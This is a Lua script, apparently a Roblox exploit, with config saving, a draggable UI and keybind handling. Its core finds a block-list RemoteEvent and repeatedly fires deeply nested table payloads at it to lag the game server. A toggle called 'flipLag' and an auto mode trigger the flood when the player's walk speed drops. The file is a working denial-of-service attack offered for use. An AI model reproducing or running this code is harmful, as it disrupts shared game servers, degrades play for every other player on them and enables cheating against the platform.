local function saveConfig()
    local data = {
        power = currentConfig.power,
        interval = currentConfig.interval,
        keybindKb = currentConfig.keybindKb,
        keybindGp = currentConfig.keybindGp,
        autoBrainrot = currentConfig.autoBrainrot,
        keybind = currentKeybind.Name
    }
    local success, encoded = pcall(function() return HttpService:JSONEncode(data) end)
    if success and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local success, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not success or type(data) ~= "table" then return end
    
    currentConfig.power = tonumber(data.power) or DEFAULT_CONFIG.power
    currentConfig.interval = tonumber(data.interval) or DEFAULT_CONFIG.interval
    currentConfig.keybindKb = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CONFIG.keybindKb
    currentConfig.keybindGp = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CONFIG.keybindGp
    currentConfig.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CONFIG.autoBrainrot
    
    if data.keybind then
        currentKeybind = Enum.KeyCode[data.keybind] or Enum.KeyCode.M
        currentConfig.keybindKb = data.keybind
    end
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    frame.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

local function isGamepadKeyCode(keyCode)
    if not keyCode then return false end
    local name = keyCode.Name
    return name:find("Button") == 1 or name:find("DPad") or name:find("Thumbstick")
end

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, c in ipairs(rrs:GetChildren()) do
        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
    end
    return nil
end

targetRemote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 1000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    if not isActive or not targetRemote then pingLoopRunning = false return end
    pingLoopRunning = true
    local delay = currentConfig.interval
    while isActive and targetRemote and pingLoopRunning do
        local payload = buildPayload(currentConfig.power)
        local success = pcall(function() targetRemote:FireServer(payload) end)
        if not success then delay = math.min(delay * 1.5, 0.5) else delay = math.max(delay * 0.995, 0.05) end
        task.wait(delay)
    end
    pingLoopRunning = false
end

function flipLag(state, isManual)
    if not state and pingLoopRunning then pingLoopRunning = false end
    isActive = state
    if isManual then
        if isBrainrotMode then manualOverride = not state else manualOverride = false end
    end
    if isActive then
        if not targetRemote then targetRemote = findRemote() if not targetRemote then isActive = false end end
        updateToggleButton()
        if isActive then task.spawn(runPingLoop) end
    else
        updateToggleButton()
    end
end

RunService.Heartbeat:Connect(function()
    if not currentConfig.autoBrainrot then
        if isBrainrotMode then isBrainrotMode = false lastBrainrotState = false if isActive then flipLag(false, false) end end
        return
    end
    local char = localPlayer.Character
    local hum = char and char:FindFirstChild("Humanoid")
    if not hum then return end
    local currentSpeed = hum.WalkSpeed
    if currentSpeed < 25 then
        if not lastBrainrotState then isBrainrotMode = true lastBrainrotState = true manualOverride = false if not isActive then flipLag(true, false) end end
    else
        if lastBrainrotState then isBrainrotMode = false lastBrainrotState = false manualOverride = false if isActive then flipLag(false, false) end end
    end
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    local kc = input.KeyCode
    if isListeningForInput then
        if (input.UserInputType == Enum.UserInputType.Keyboard or isGamepadKeyCode(kc)) and not BLACKLISTED[kc] then
            currentKeybind = kc
            currentConfig.keybindKb = kc.Name
            isListeningForInput = false
            saveConfig()
        end
        return
    end
    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        return
    end
    if kc == currentKeybind then flipLag(not isActive, true) end
end)
